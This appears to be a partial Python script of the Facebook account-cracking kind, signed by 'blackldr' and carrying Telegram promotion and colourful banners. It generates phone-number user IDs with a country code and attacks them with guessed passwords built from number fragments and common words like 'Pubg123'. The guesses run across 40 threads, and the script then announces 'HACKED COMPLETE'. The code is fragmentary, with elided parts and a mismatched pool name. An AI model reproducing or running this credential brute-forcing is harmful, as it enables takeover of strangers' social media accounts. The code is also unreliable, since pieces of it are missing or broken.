# Gift By blackldr
# Telegram Id : @blackldr
# Telegram : https://t.me/blackldr
# Facebook Group : nai
...
.########.########..##.....##
\033[1;91m╔═════════════════════════╗
\033[1;92m   	ᏀᏆҒͲ ᏴƳ LDR
\033[1;91m╚═════════════════════════╝
""") 
 
def Alhaj():
    os.system('clear')
    os.system('xdg-open nai')
    print(logo)
    print("")
    print("\033[1;96m ╔═════════════════════════════════╗")
...
def Alhajs():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=40) as LDR:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print("\033[1;91m╔═════════════════════════════════════╗")
        ...
        print(f'\033[1;91m║\033[1;92m ᏀᏆҒͲ ᏴƳ LDR ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','LDR']
            uid = code+love
            Fb_crack.submit(Alhajm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    print(' \033[1;91m[\033[1;92m💥\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m👿\033[1;91m]\033[1;92m HI IM LDR ')
    print("\033[1;91m╚═══════════════════════════╝")
